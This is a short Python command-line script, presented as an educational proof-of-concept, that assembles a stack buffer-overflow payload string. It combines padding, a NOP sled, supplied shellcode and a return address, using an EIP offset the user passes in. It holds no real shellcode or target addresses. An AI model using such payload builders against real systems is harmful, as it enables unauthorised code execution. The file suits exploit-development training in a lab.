#!/usr/bin/python3

"""
PYTHON2 BOF Exploit Script 
Author: Jesús Vargas (@MrEkos)
Description:
    Educational proof-of-concept buffer overflow script to create a payload.
    
⚠️ Disclaimer
This script is an educational proof-of-concept template intended for use in your own lab environments only. 
It does not contain real return addresses or live shellcode and will not execute as-is.
Do not use it against systems you do not own or without explicit permission.
Do not include proprietary content or spoilers from platforms such as Hack The Box.
Use at your own risk.

Usage: Copy and paste the code in a new text file and save it with the .py at the end then give execute permissions in order to run, for example:
sudo nano bof_exploit.py
sudo chmod +x bof_exploit.py
./bof_exploit.py --help

"""
import click

def building(eip, address, nops, length, shellcode):
    # Padding to reach EIP overwrite (4 bytes for EIP)
    pad_len = eip - 4 - nops - length
    if pad_len < 0:
        pad_len = 0  # avoid negatives
    # sequences (print as visible \x..)
    padding_str = "\\x33"
    sled_str    = "\\x90"
    # keep output as a single quoted string; escape single quotes if present
    shellcode_escaped = shellcode.replace("'", "\\'")
    address_escaped   = address.replace("'", "\\'")
    # Building the string
    expr = (
        f"'{padding_str}' * {pad_len} + "
        f"'{sled_str}' * {nops} + "
        f"'{shellcode_escaped}' + "
        f"'{address_escaped}'"
    )
    return expr

@click.command()
@click.option('--eip', '-b', type=int, required=True,
              help='Total bytes up to EIP overwrite (offset).')
@click.option('--address', '-ra', type=str, required=True,
              help='Return address string (little endian)')
@click.option('--nops', '-n', type=int, required=True,
              help='Number of NOPs in the sled.')
@click.option('--length', '-l', 'length', type=int, required=True,
              help='Shellcode length in bytes (used for padding math).')
@click.option('--shellcode', '-s', required=True,
              help='Shellcode string (e.g. \\x90\\x90...).')
def main(eip, address, nops, length, shellcode):
    if eip < 4:
        raise click.BadParameter("`--eip` must be >= 4 (EIP is 4 bytes).")
    expr = building(eip, address, nops, length, shellcode)
    print('print ', expr)

if __name__ == "__main__":
    main()
